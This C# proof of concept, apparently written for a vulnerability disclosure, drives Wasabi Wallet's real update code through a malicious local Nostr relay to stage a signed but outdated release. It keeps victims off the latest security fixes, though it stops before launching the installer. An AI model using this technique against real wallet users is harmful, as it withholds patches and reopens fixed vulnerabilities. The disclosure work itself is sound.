using System.Net.Http;
using NNostr.Client;
using System.Security.Cryptography;
using WalletWasabi.Discoverability;
using WalletWasabi.Helpers;
using WalletWasabi.Services;

// PoC for: Wasabi's update path can be driven to download, verify, and stage for install
// a genuinely Wasabi-signed release that is OLDER THAN THE LATEST (stale-version pinning).
//
// Note this is NOT a rollback of the running binary: UpdateManager only accepts an
// announced version greater than the current one, so it can never move a victim below
// what they run. It denies them the newest release by pinning them to an older-than-latest
// but still-newer-than-current signed build, re-exposing everything fixed in between.
//
// poc-nostr-forgery proved the client ACCEPTS a forged announcement. This goes the whole
// distance: it wires the REAL production UpdateManager + ReleaseDownloader exactly as
// WalletWasabi.Client/Global.cs:ConfigureWasabiUpdater does, points them at a malicious
// relay that announces the real, signed, but stale 2.7.0, and shows the client verify the
// authentic SHA256SUMS.wasabisig against the hardcoded WasabiPubKey, match the installer
// hash, and publish NewSoftwareVersionInstallerAvailable. On exit,
// WalletWasabi.Fluent.Desktop/Program.cs feeds exactly that path to
// Installer.StartInstallingNewVersion when DownloadNewVersion is on (the default).

class Program
{
    static async Task<int> Main()
    {
        // The victim is on 2.6.0. The attacker offers the older, still-signed 2.7.0
        // (2.8.2 is current), so the announced version is > current and is accepted.
        var victimVersion = new Version(2, 6, 0);

        var eventBus = new EventBus();
        var httpClientFactory = new SimpleHttpClientFactory();

        // Mirrors Global.cs: a client factory over the relay set. In production this is
        // three Tor-routed relays; here it is the one malicious relay. Only one of the
        // relays needs to deliver the event.
        Uri[] relayUrls = [new("ws://127.0.0.1:7777")];
        Func<INostrClient> nostrClientFactory = () => NostrClientFactory.Create(relayUrls, (System.Net.EndPoint?)null);

        // The exact downloader Global.cs uses on a supported OS (auto-download default).
        var installerDownloader = ReleaseDownloader.ForOfficiallySupportedOSes(httpClientFactory, eventBus);

        var updater = UpdateManager.CreateUpdater(nostrClientFactory, installerDownloader, eventBus, currentVersion: victimVersion);

        using var _1 = eventBus.Subscribe<NewSoftwareVersionAvailable>(e =>
        {
            var s = e.UpdateStatus;
            Console.WriteLine($"[POC] NewSoftwareVersionAvailable: version={s.ClientVersion} upToDate={s.ClientUpToDate} readyToInstall={s.IsReadyToInstall}");
        });
        using var _2 = eventBus.Subscribe<NewSoftwareVersionInstallerAvailable>(e =>
        {
            Console.WriteLine($"[POC] NewSoftwareVersionInstallerAvailable: {e.InstallerPath}");
            if (File.Exists(e.InstallerPath))
            {
                var bytes = File.ReadAllBytes(e.InstallerPath);
                var hash = Convert.ToHexString(SHA256.HashData(bytes)).ToLowerInvariant();
                Console.WriteLine($"[POC] downloaded {bytes.Length} bytes, sha256 = {hash}");
                Console.WriteLine("[POC] the installer was verified by the PRODUCTION code:");
                Console.WriteLine("        - SHA256SUMS.wasabisig checked against the hardcoded WasabiPubKey");
                Console.WriteLine("        - installer hash matched the signed sums");
                Console.WriteLine("[POC] on exit, Program.cs hands this path to Installer.StartInstallingNewVersion.");
                Console.WriteLine("[POC] (this PoC stops here and does NOT launch the installer.)");
            }
        });

        Console.WriteLine($"[POC] victim currentVersion = {victimVersion}; running the production updater once...");
        using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(5));

        await updater(new UpdateManager.UpdateMessage(), Unit.Instance, cts.Token);

        Console.WriteLine();
        Console.WriteLine("[POC] VULNERABLE: a genuinely-signed release older than the latest passed every");
        Console.WriteLine("      client-side check and is staged to install. The victim's version rises to");
        Console.WriteLine("      2.7.0 but never reaches the latest 2.8.2. No version ceiling vs the latest.");
        return 0;
    }
}

// Minimal IHttpClientFactory; production uses a Tor-routed one, transport is irrelevant here.
sealed class SimpleHttpClientFactory : IHttpClientFactory
{
    public HttpClient CreateClient(string name) => new() { Timeout = TimeSpan.FromMinutes(4) };
}
